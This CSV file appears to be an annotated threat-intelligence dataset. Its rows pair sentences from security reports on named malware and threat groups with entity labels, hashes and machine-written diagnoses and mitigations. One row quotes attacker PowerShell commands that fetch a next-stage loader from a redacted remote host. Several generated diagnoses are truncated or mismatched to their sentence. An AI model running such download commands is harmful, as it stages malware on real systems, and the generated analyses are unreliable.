id,text,relations,diagnosis,solutions,id_1,label_1,start_offset_1,end_offset_1,id_2,label_2,start_offset_2,end_offset_2,id_3,label_3,start_offset_3,end_offset_3
1789,"Infection chain      Figure 1. AvosLocker infection chain      According to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit:      Figure 2.","[{'from_id': 5293, 'id': 260, 'to_id': 46920, 'type': 'exploits'}]","AvosLocker malware infection caused by a vulnerability in Zoho ManageEngine ADSelfService Plus, exploited through the use of exploits.","1. Patch management: Regularly update software and applications to fix vulnerabilities and prevent exploitation by malware like AvosLocker.  2. Network segmentation: Isolate critical systems and sensitive data from the rest of the network to limit the spread of malware in case of an infection.  3. Endpoint protection: Deploy endpoint security solutions like antivirus, firewalls, and intrusion detection/prevention systems to detect and block malware like AvosLocker.  4. User awareness training: Educate employees on safe browsing habits, phishing",5293,malware,31,41,46920,vulnerability,127,178,,,,
3617,"In our new research blog “FreeMilk: A Highly Targeted Spear Phishing Campaign”, our Unit 42 research team has discovered an attack campaign that takes spear phishing targeting to the next level by hijacking in-progress email conversations.","[{'from_id': 49402, 'id': 791, 'to_id': 49400, 'type': 'uses'}, {'from_id': 49402, 'id': 792, 'to_id': 49401, 'type': 'uses'}]",Diagnosis: Spear Phishing Attack  Entity: Unit 42 research team  Relationship: The research team discovered the spear phishing attack campaign and identified the attack patterns and campaign involved. The campaign uses hijacking techniques to target in-progress email conversations.,1. Employee Training: Providing regular training to employees to identify and avoid spear phishing attacks can help prevent such attacks from being successful.  2. Email Filtering: Implementing email filtering solutions that can detect and block suspicious emails before they reach the user's inbox can help prevent spear phishing attacks.  3. Two-Factor Authentication: Implementing two-factor authentication for email and other critical systems can help prevent unauthorized access to sensitive information.  4. Endpoint Protection: Deploying endpoint protection solutions that can detect and block malware,49399,identity,84,105,49400,attack-pattern,151,165,49401,attack-pattern,197,238
13641,The recent campaigns target senior positions in the United States and Canada.,"[{'from_id': 51728, 'id': 1145, 'to_id': 51729, 'type': 'targets'}, {'from_id': 51729, 'id': 1146, 'to_id': 51730, 'type': 'located-at'}, {'from_id': 51729, 'id': 1147, 'to_id': 51731, 'type': 'located-at'}]","The diagnosis is a targeted cyber attack on senior positions in the United States and Canada. The campaign was specifically designed to target these individuals, with the attackers likely using sophisticated social engineering tactics to gain access to sensitive information. The campaign appears to have been carried","1. Implement multi-factor authentication for all senior positions in the United States and Canada to prevent unauthorized access to sensitive information. 2. Conduct regular security awareness training for senior positions to educate them on social engineering tactics and how to identify and avoid them. 3. Deploy advanced threat detection and prevention tools that can identify and block targeted cyber attacks, such as intrusion detection systems and firewalls. 4. Conduct regular vulnerability assessments and penetration testing to identify potential weaknesses in the organization's security posture and address them before they",51729,identity,28,44,51731,location,70,76,51728,campaign,4,20
13632,The code used to obtain user QQ numbers     Protecting e-commerce platforms from Water Pamola’s attacks Water Pamola attacked online merchants with an XSS script appended onto online shopping orders.,"[{'from_id': 51717, 'id': 1141, 'to_id': 51719, 'type': 'uses'}, {'from_id': 51717, 'id': 1140, 'to_id': 51718, 'type': 'targets'}]","Diagnosis: The e-commerce platform is vulnerable to Water Pamola's attacks, specifically an XSS script appended onto online shopping orders. The attacker targeted the platform using a campaign, and their identity is known. The platform should implement measures to protect against XSS","1. Implementing a web application firewall (WAF) to detect and block malicious traffic, including XSS attacks. 2. Conducting regular vulnerability assessments and penetration testing to identify and remediate any weaknesses in the platform's defenses. 3. Implementing strict input validation and output encoding to prevent malicious scripts from being injected into the platform's code. 4. Educating employees and customers on how to identify and report potential security threats, such as suspicious emails or orders. 5. Implementing multi-factor authentication",51716,campaign,81,93,51717,campaign,104,116,51718,identity,126,142
4266,"The other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, Detected as TROJ_DELF.XXWZ) is related to a domain reported in September 2016.","[{'from_id': 50068, 'id': 914, 'to_id': 50069, 'type': 'indicates'}]",The entity (hash value 1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a) is diagnosed as the malware T,1. Implementing robust antivirus software that can detect and quarantine the malware T. 2. Conducting regular vulnerability assessments and penetration testing to identify and address any security gaps in the system. 3. Implementing network segmentation to limit the spread of malware and isolate infected systems. 4. Implementing strict access controls and user authentication protocols to prevent unauthorized access to the system. 5. Conducting regular security awareness training for employees to educate them on cybersecurity best practices and how to identify and report potential security threats.,50069,malware,102,116,50070,TIME,153,167,50068,hash,24,88
13960,"In a US Senate hearing on cybersecurity threats, Senator Rob Portman of Ohio described the strike on Colonial Pipeline as “potentially the most substantial and damaging attack on US critical infrastructure ever.”","[{'from_id': 48769, 'id': 459, 'to_id': 48768, 'type': 'related-to'}, {'from_id': 48769, 'id': 460, 'to_id': 48770, 'type': 'related-to'}]",Cybersecurity Threat: Strike on Colonial Pipeline Entity: US critical infrastructure Relationship: Potentially the most substantial and damaging attack  Diagnosis: The strike on Colonial Pipeline is a severe cybersecurity threat that has caused significant damage to US critical infrastructure.,1. Improved network segmentation and access control to prevent attackers from gaining access to critical systems and data. 2. Implementation of advanced threat detection and response systems to quickly identify and respond to potential threats. 3. Regular cybersecurity training and awareness programs for employees to prevent human error and ensure adherence to security protocols. 4. Regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network and systems. 5. Implementation of multi-factor authentication to prevent unauthorized access to critical systems and data. 6. Regular,48769,identity,49,68,48768,identity,5,14,48770,location,72,77
3697,"Carbanak also performs techniques for disabling security tools, deleting files that are left in malicious activity, and modifying registry to hide configuration information.","[{'from_id': 49492, 'id': 806, 'to_id': 49491, 'type': 'uses'}, {'from_id': 49492, 'id': 807, 'to_id': 49493, 'type': 'uses'}, {'from_id': 49492, 'id': 808, 'to_id': 49494, 'type': 'uses'}]","The diagnosis is a cyber attack by the threat actor Carbanak, who uses various attack patterns such as disabling security tools, deleting files, and modifying registry to hide configuration information. The relationship between the entities shows that Carbanak uses these attack patterns",1. Implementing multi-layered security protocols to prevent disabling of security tools by Carbanak. 2. Regularly backing up critical files to prevent loss due to deletion by Carbanak. 3. Deploying advanced threat detection and response systems to identify and mitigate the effects of Carbanak's registry modifications. 4. Conducting regular security audits and penetration testing to identify vulnerabilities that Carbanak may exploit. 5. Educating employees on cybersecurity best practices to prevent social engineering attacks that may lead,49494,attack-pattern,120,138,49493,attack-pattern,64,78,49491,attack-pattern,38,62
4286,"The group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost.","[{'from_id': 50084, 'id': 917, 'to_id': 50085, 'type': 'uses'}, {'from_id': 50084, 'id': 918, 'to_id': 50086, 'type': 'uses'}]","The threat actor is using the Badnews malware as an attack pattern to steal information and execute files. They have updated the malware with a slight modification in the encryption routine, adding Blowfish encryption on top of their custom encryption.",1. Implement robust antivirus software that can detect and remove the Badnews malware and its variants. 2. Conduct regular security awareness training to educate employees on how to identify and avoid phishing emails that may contain the Badnews malware. 3. Implement network segmentation to isolate critical systems and limit the spread of malware in case of an attack. 4. Use intrusion detection and prevention systems to detect and block any attempts to exploit vulnerabilities and execute malware. 5. Implement endpoint protection solutions that can detect and block malicious files,50084,malware,25,40,50085,attack-pattern,58,78,50086,attack-pattern,83,97
5108,"&amp;nbsp; [Lightly edited transcript of the video above] Hi there, Mark Nunnikhoven from Trend Micro Research, I want to talk to you about the concept of lateral movement.","[{'from_id': 51209, 'id': 1071, 'to_id': 51210, 'type': 'related-to'}]",Diagnosis: Identity Theft  Entity: Two identities (one victim and one attacker)  Relationship: Related to each other (identity theft),"1. Strengthening Passwords: One of the most common ways that attackers steal identities is through weak passwords. Encourage users to create strong passwords that are unique, complex, and difficult to guess.  2. Two-Factor Authentication: Two-factor authentication adds an extra layer of security to the login process, making it more difficult for attackers to gain access to an account.  3. Identity Verification: Implementing identity verification processes can help prevent identity theft by verifying the identity of the person attempting to access",51211,attack-pattern,155,171,51209,identity,68,84,51210,identity,90,110
4204,"Back in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia.","[{'from_id': 50015, 'id': 898, 'to_id': 50016, 'type': 'related-to'}, {'from_id': 50015, 'id': 899, 'to_id': 50017, 'type': 'targets'}, {'from_id': 50016, 'id': 900, 'to_id': 50017, 'type': 'targets'}, {'from_id': 50016, 'id': 901, 'to_id': 50015, 'type': 'related-to'}]","The diagnosis is that there is a cyber threat actor group, identified as Patchwork and Confucius, targeting entities primarily located in South Asia. The entities targeted are identified as locations. There is a relationship between the threat actor group and the targeted entities","1. Implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and endpoint protection solutions to prevent unauthorized access and data breaches. 2. Conducting regular security assessments and vulnerability scans to identify and address any potential weaknesses in the IT infrastructure. 3. Deploying advanced threat intelligence solutions that can detect and block threats in real-time. 4. Educating employees on cybersecurity best practices such as password management, phishing prevention, and social engineering awareness. 5. Establishing a security incident",50016,threat-actor,70,79,50014,TIME,8,16,50015,threat-actor,56,65
3398,BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  75e03f40a088903579a436c0d8e8bc3d0d71cf2942ad793cc948f36866a2e1ad  silverlight_ins.exe,"[{'from_id': 49061, 'id': 628, 'to_id': 10260, 'type': 'duplicate-of'}, {'from_id': 10259, 'id': 629, 'to_id': 49060, 'type': 'duplicate-of'}, {'from_id': 10260, 'id': 630, 'to_id': 49060, 'type': 'indicates'}, {'from_id': 49061, 'id': 631, 'to_id': 49060, 'type': 'indicates'}]","The diagnosis is that the entity ""silverlight_ins.exe"" has been infected with the BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A malware, which is indicated by the hash value ""75e03f40a088903579",1. Install and regularly update antivirus software to detect and remove malware such as BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A. 2. Implement a firewall to block unauthorized access to the system and prevent the malware from communicating with its command and control server. 3. Conduct regular system scans and vulnerability assessments to identify and address any security weaknesses that could be exploited by attackers. 4. Use intrusion detection and prevention systems to monitor network traffic and identify any suspicious activity or attempts to exploit vulnerabilities,10259,malware,0,11,49060,malware,20,44,10260,hash,46,110
1542,"The Sofacy Group (AKA APT28, Grizzly Steppe, Fancy Bear, STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known hacking organization widely reported to be associated with Russia by the US Intelligence Community, numerous media reports and other cybersecurity companies.","[{'from_id': 45045, 'id': 59, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45046, 'id': 60, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45048, 'id': 62, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45049, 'id': 63, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45050, 'id': 64, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45046, 'id': 68, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45047, 'id': 69, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45051, 'id': 65, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45052, 'id': 66, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45048, 'id': 70, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45049, 'id': 71, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45050, 'id': 72, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45047, 'id': 61, 'to_id': 45053, 'type': 'located-at'}, {'from_id': 45051, 'id': 73, 'to_id': 45045, 'type': 'duplicate-of'}, {'from_id': 45052, 'id': 74, 'to_id': 45045, 'type': 'duplicate-of'}]","The Sofacy Group is a threat actor located in Russia, known for their hacking activities.","1. Implementing a strong network security system that includes firewalls, intrusion detection and prevention systems, and antivirus software to prevent unauthorized access to sensitive data and protect against malware attacks.  2. Conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system.  3. Educating employees on cybersecurity best practices, such as password management, phishing awareness, and social engineering tactics, to prevent human error and minimize the risk of a successful attack.  4. Implementing multi-factor authentication (",45045,threat-actor,4,16,45046,threat-actor,22,27,45051,threat-actor,76,85
207,"On Feb. 23, a malicious file named conhosts._exe (SHA256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591) was uploaded to a public malware repository from an organization in Kyiv, Ukraine.","[{'from_id': 678, 'id': 133, 'to_id': 44631, 'type': 'indicates'}]","The organization in Kyiv, Ukraine has uploaded a malicious file named conhosts._exe (SHA256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a267",1. Implement a robust antivirus solution that can detect and quarantine malicious files like conhosts._exe. 2. Conduct regular employee training sessions to educate them on the risks of downloading and opening suspicious files. 3. Implement a firewall that can block incoming traffic from known malicious IP addresses. 4. Use a security information and event management (SIEM) system to monitor and analyze network traffic for any suspicious activity. 5. Implement a patch management system to ensure that all software and systems are up-to-date with,678,hash,58,122,44630,location,192,205,44631,FILEPATH,35,48
4205,"During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets.","[{'from_id': 50018, 'id': 902, 'to_id': 50019, 'type': 'targets'}]","Possible diagnosis: Confucius is a threat actor targeting Pakistani entities. There is a cyber threat against Pakistani targets, and Confucius is identified as the actor behind it. The relationship between Confucius and the Pakistani targets is defined as ""targets",1. Implementing strong access controls and authentication mechanisms to prevent unauthorized access to sensitive information and systems.  2. Conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network infrastructure.  3. Deploying advanced threat detection and prevention tools such as Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) to detect and block malicious activity.  4. Enhancing employee cybersecurity awareness and training to promote a culture of cybersecurity and identify potential threats.  5. Implementing a,50019,location,116,125,50018,threat-actor,52,61,,,,
684,"While still not seen in the wild, similar exploits in Microsoft Equation Editor, such as such as CVE-2018-0807 and CVE-2018-0798, were identified by Unit 42 researchers.","[{'from_id': 44827, 'id': 29, 'to_id': 44825, 'type': 'has'}, {'from_id': 44827, 'id': 28, 'to_id': 44824, 'type': 'has'}]",The entity (SOFTWARE) has two vulnerabilities (CVE-2018-0807 and CVE-2018-0798) that were identified by Unit 42 researchers.,1. Patch Management: The entity can implement a patch management system to ensure that all software vulnerabilities are identified and patched in a timely manner. This will help to prevent future vulnerabilities from being exploited.  2. Network Segmentation: The entity can implement network segmentation to isolate vulnerable systems from the rest of the network. This will help to prevent the spread of malware and other threats to other systems on the network.  3. Intrusion Detection and Prevention: The entity can implement an intrusion detection and prevention system to,2275,identity,149,156,44827,SOFTWARE,54,79,44824,vulnerability,97,110
2386,"It has many of the same capabilities as another backdoor, Crosswalk, which has also been used by Earth Baku.","[{'from_id': 47451, 'id': 330, 'to_id': 47450, 'type': 'uses'}]","The diagnosis is that a threat actor (Earth Baku) is using a malware (Crosswalk) that has similar capabilities to another backdoor (unspecified) to carry out cyber attacks. The entities involved are the threat actor and the malware, and","1. Implement a robust and up-to-date anti-malware solution that can detect and block the Crosswalk malware and any other backdoors with similar capabilities.  2. Conduct regular vulnerability assessments and penetration testing to identify and remediate any weaknesses in the network and systems that could be exploited by threat actors like Earth Baku.  3. Deploy intrusion detection and prevention systems that can monitor network traffic and detect any suspicious activity, including attempts to install or execute malware.  4. Implement strict access controls and authentication",47451,threat-actor,97,107,47450,malware,58,67,,,,
3397,BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  6ee8f6a0c514a5bd25f7a32210f4b3fe878d9d417a7ebe07befc285131bae10e  news.exe,"[{'from_id': 49059, 'id': 626, 'to_id': 49058, 'type': 'indicates'}, {'from_id': 10258, 'id': 627, 'to_id': 49058, 'type': 'indicates'}, {'from_id': 10257, 'id': 624, 'to_id': 49058, 'type': 'duplicate-of'}, {'from_id': 49059, 'id': 625, 'to_id': 10258, 'type': 'duplicate-of'}]","The entity ""news.exe"" has been infected with the Backdoor.Win64.BIOPASS.A malware, which was loaded via the BIOPASS RAT Loader. The hash value of the malware is 6ee8f6a0c514",1. Implement robust antivirus and anti-malware software that can detect and remove the Backdoor.Win64.BIOPASS.A malware. 2. Conduct regular vulnerability assessments and penetration testing to identify and address potential security loopholes that could be exploited by malware like BIOPASS RAT Loader. 3. Implement network segmentation and access controls to limit the spread of malware infections. 4. Educate employees on safe browsing habits and the risks associated with downloading and executing suspicious files. 5. Use endpoint detection and,10258,hash,46,110,10257,malware,0,11,49059,FILEPATH,112,120
3479,Encrypted configurations of Protux (top) and Marade (bottom) in the same blog post Correlating Marade and Protux,"[{'from_id': 49283, 'id': 778, 'to_id': 49284, 'type': 'variant-of'}]",Diagnosis: Malware infection Entities: Protux and Marade Relationship: Marade is a variant of Protux,"1. Install and regularly update anti-virus software to detect and remove malware infections, including Protux and its variants such as Marade. 2. Use a firewall to prevent unauthorized access to your system and block any suspicious traffic that may be associated with malware. 3. Implement strong password policies and multi-factor authentication to prevent unauthorized access to your system and sensitive data. 4. Conduct regular security audits and vulnerability assessments to identify and address any weaknesses or vulnerabilities in your system that could be exploited by malware.",49281,malware,28,34,49282,malware,45,51,49283,malware,95,101
3713,"In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method.","[{'from_id': 49510, 'id': 812, 'to_id': 49511, 'type': 'uses'}, {'from_id': 49510, 'id': 813, 'to_id': 49509, 'type': 'uses'}]","Diagnosis: Carbanak attacks involve a threat actor logging into services that accept remote connections and using stolen password hashes through the ""pass the hash"" method. The threat actor uses this attack pattern to carry out the attacks.","1. Implementing two-factor authentication (2FA) for all remote access services to prevent unauthorized access. 2. Regularly changing passwords and using strong, complex passwords to make it difficult for threat actors to steal password hashes. 3. Implementing network segmentation to limit the spread of attacks and prevent lateral movement within the network. 4. Monitoring network activity and user behavior to detect and respond to suspicious activity. 5. Using endpoint protection software to detect and prevent malware that may be used in Carbanak",49509,attack-pattern,152,165,49510,threat-actor,3,11,49511,attack-pattern,110,138
3670,"To be more specific in terms of ATT&CK® techniques, Carbanak and FIN7 share a notable number of similarities.","[{'from_id': 49460, 'id': 802, 'to_id': 49461, 'type': 'related-to'}]","Threat actors Carbanak and FIN7 are related in terms of ATT&CK® techniques, indicating a potential cybersecurity issue involving coordinated attacks or collaboration between the two entities.",1. Implementing threat intelligence feeds and monitoring tools to detect and track the activities of Carbanak and FIN7. 2. Conducting regular vulnerability assessments and penetration testing to identify and remediate potential weaknesses in the organization's security posture. 3. Deploying advanced endpoint protection solutions that can detect and prevent malicious activities associated with Carbanak and FIN7. 4. Implementing access controls and segmentation to limit the impact of a potential attack from Carbanak and FIN7. 5. Conducting,49461,threat-actor,65,69,49460,threat-actor,52,60,,,,
4558,"During our investigation into the Turla CyberAzov apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites.","[{'from_id': 50368, 'id': 950, 'to_id': 50369, 'type': 'targets'}]","The diagnosis is that a new Android app has been identified in the wild that claims to conduct DoS attacks against Russian websites. This app is believed to be a type of malware, and it targets software to carry out its attacks. The app was first",1. Implementing stricter app store policies and vetting processes to prevent malicious apps from being published and distributed to users. 2. Developing and deploying advanced malware detection and removal tools that can identify and remove the DoS malware from infected devices. 3. Educating users on safe app installation practices and warning them against downloading apps from untrusted sources. 4. Conducting regular security audits and vulnerability assessments of websites to identify and patch any vulnerabilities that could be exploited in DoS attacks. 5. Deploying,50370,TIME,116,126,50368,malware,34,54,50369,SOFTWARE,78,85
5066,Recently observed Ghostwriter credential phishing domains:,"[{'from_id': 51172, 'id': 1067, 'to_id': 51173, 'type': 'uses'}]",The threat actor is using an attack pattern to conduct credential phishing using Ghostwriter domains. This indicates a potential cyber espionage or cybercrime activity. It is recommended to investigate and mitigate the threat as soon as possible.,1. Implement multi-factor authentication for all user accounts to prevent unauthorized access. 2. Train employees on how to identify and avoid phishing emails and websites. 3. Use a secure email gateway to filter out malicious emails before they reach employees' inboxes. 4. Implement a web filtering solution to block access to known malicious domains and websites. 5. Conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 6. Implement a security information and event management (SIEM) solution to monitor network,51172,threat-actor,18,29,51173,attack-pattern,30,49,,,,
3178,"Furthermore, BIOPASS RAT also creates scheduled tasks to load the Cobalt Strike shellcode during the initialization, indicating that the malicious actor behind the attack still heavily relies on Cobalt Strike.","[{'from_id': 48304, 'id': 402, 'to_id': 48305, 'type': 'uses'}]","The diagnosis for this cybersecurity issue is that a malware called BIOPASS RAT is being used by a malicious actor to load the Cobalt Strike shellcode through scheduled tasks. The actor heavily relies on Cobalt Strike, indicating that they may have advanced knowledge",1. Implementing a robust anti-malware solution that can detect and remove BIOPASS RAT from the system. 2. Conducting regular vulnerability assessments and penetration testing to identify and address any security weaknesses that could be exploited by the attacker. 3. Enforcing strict access controls and user permissions to prevent unauthorized access to critical systems and data. 4. Monitoring scheduled tasks and other system activities for any suspicious behavior or unauthorized changes. 5. Deploying endpoint detection and response (EDR) solutions that,48304,malware,13,24,48305,tools,66,79,48306,tools,195,208
3180,"In this blog entry, we will dive deeper into BIOPASS RAT with a detailed technical analysis of the infection chain, the different components of the malware, and any possible associations with Winnti.","[{'from_id': 48310, 'id': 404, 'to_id': 48309, 'type': 'related-to'}]","The diagnosis is a potential cyber attack perpetrated by a threat actor using the BIOPASS RAT malware, which may be associated with the Winnti group.",1. Implementing endpoint protection software that can detect and block the BIOPASS RAT malware. 2. Conducting regular vulnerability assessments and penetration testing to identify and patch any weaknesses in the network. 3. Implementing multi-factor authentication to prevent unauthorized access to sensitive data and systems. 4. Implementing network segmentation to limit the spread of malware in case of a breach. 5. Conducting regular employee training on cybersecurity best practices and how to identify and report potential cyber threats. 6. Implementing a,48309,threat-actor,192,198,48310,malware,45,56,,,,
2370,"Earth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment:  • SQL injection to upload a malicious file • Installment through InstallUtil.exe in a scheduled task • Possibly a malicious link (LNK) file sent as an email attachment • Exploitation of the ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell  This campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross.","[{'from_id': 45479, 'id': 100, 'to_id': 45472, 'type': 'duplicate-of'}, {'from_id': 45480, 'id': 323, 'to_id': 7033, 'type': 'uses'}, {'from_id': 45480, 'id': 324, 'to_id': 7034, 'type': 'uses'}]","The diagnosis is a targeted cyber attack using multiple attack vectors, including SQL injection, scheduled task installation, malicious email attachments, and exploitation of the ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell. The attack",1. Implementing a robust firewall to block unauthorized access attempts and prevent SQL injection attacks. 2. Regularly updating and patching systems to mitigate vulnerabilities such as the ProxyLogon vulnerability CVE-2021-26855. 3. Conducting regular security awareness training for employees to prevent them from falling victim to malicious email attachments. 4. Using advanced threat detection and response tools to identify and mitigate attacks in real-time. 5. Implementing strict access controls and monitoring suspicious activities to prevent the installation of,45480,threat-actor,0,10,45472,vulnerability,444,458,45474,malware,578,591
3383,BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  30d9ffd4b92a4ed67569a78ceb25bb6f66346d1c0a7d6d6305e235cbdfe61ebe  Silverlight_ins.exe,"[{'from_id': 10230, 'id': 578, 'to_id': 49033, 'type': 'duplicate-of'}, {'from_id': 49034, 'id': 579, 'to_id': 10231, 'type': 'duplicate-of'}, {'from_id': 49034, 'id': 580, 'to_id': 49033, 'type': 'indicates'}, {'from_id': 10231, 'id': 581, 'to_id': 49033, 'type': 'indicates'}]","The entity Silverlight_ins.exe is infected with the BIOPASS RAT Loader Backdoor.Win32.BIOPASS.A malware, as indicated by the hash value 30d9ffd4b92a4ed67569a78ceb25bb",1. Install and regularly update antivirus software to detect and remove malware. 2. Implement firewalls to block unauthorized access to the network and prevent malware from communicating with its command and control server. 3. Conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 4. Train employees on how to identify phishing emails and other social engineering tactics used by cybercriminals to deliver malware. 5. Use endpoint detection and response (EDR) solutions to monitor and respond to suspicious activity on endpoints.,10230,malware,0,11,10231,hash,46,110,49034,FILEPATH,112,131
4566,"The Sandworm campaign used compromised government accounts to send links to Microsoft Office documents hosted on compromised domains, primarily targeting media organizations in Ukraine.","[{'from_id': 50395, 'id': 957, 'to_id': 50396, 'type': 'uses'}, {'from_id': 50395, 'id': 958, 'to_id': 50397, 'type': 'targets'}]",Diagnosis: The Sandworm campaign utilized a compromised government account to conduct an attack pattern targeting media organizations in Ukraine. The attack involved the use of malicious links embedded in Microsoft Office documents hosted on compromised domains. The campaign primarily targeted media organizations in Ukraine.,1. Implement multi-factor authentication for all government accounts to prevent unauthorized access and compromise. 2. Conduct regular security awareness training for government employees to educate them on the dangers of phishing attacks and how to identify and avoid them. 3. Implement a robust email filtering system to detect and block malicious links and attachments. 4. Regularly monitor and scan government systems for any signs of compromise or suspicious activities. 5. Develop and implement strict access controls and permissions for all government accounts and systems to limit the potential impact,50395,campaign,4,21,50396,attack-pattern,27,58,50397,SOFTWARE,76,92
13543,"Instead, malicious scripts are being executed when the administrators look into customer orders in their online shop’s administration panel.","[{'from_id': 51616, 'id': 1112, 'to_id': 51615, 'type': 'targets'}, {'from_id': 51614, 'id': 1113, 'to_id': 51615, 'type': 'uses'}]","The diagnosis is a malware attack targeting the software used by the online shop's administration panel, with the malicious scripts being executed when administrators look into customer orders. The attack may have compromised the identity of customers and poses a serious cybersecurity threat.",1. Install and regularly update antivirus software on all devices used by administrators to access the online shop's administration panel. 2. Implement two-factor authentication for all administrator accounts to prevent unauthorized access. 3. Conduct regular security audits to identify and address vulnerabilities in the online shop's software. 4. Implement network segmentation to isolate the administration panel from other parts of the network. 5. Train administrators on how to identify and avoid phishing attacks and other common malware delivery methods. 6. Implement a web application firewall (,51614,identity,55,69,51615,SOFTWARE,105,139,51616,malware,9,26
4037,"After the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin). C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.exe' ""%temp%/dfmanager.exe""}"" C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.bin' ""C:\Users\<redacted>\AppData\Local\Temp/dfmanager.bin""}""","[{'from_id': 49885, 'id': 889, 'to_id': 49881, 'type': 'exploits'}, {'from_id': 49885, 'id': 890, 'to_id': 49882, 'type': 'uses'}, {'from_id': 49885, 'id': 891, 'to_id': 49883, 'type': 'uses'}, {'from_id': 49883, 'id': 892, 'to_id': 49884, 'type': 'downloads'}]","The diagnosis is a cyber attack involving the ProxyLogon exploits and web shells. The threat actors gain access to vulnerable hosts and use bitsadmin to download a next-stage loader, which is detected as Nerapack, along with its payload file. The",1. Patch and update all vulnerable systems immediately to prevent the exploitation of ProxyLogon vulnerabilities.  2. Implement multi-factor authentication (MFA) to prevent unauthorized access to systems and accounts.  3. Monitor network traffic and logs for any suspicious activities and investigate any anomalies.  4. Use endpoint protection solutions and keep them up-to-date to detect and prevent the use of web shells and other malware.  5. Implement network segmentation to limit the spread of the attack and prevent lateral movement.  6. Conduct regular,49882,attack-pattern,92,102,49888,FILEPATH,385,405,49891,URL,566,618
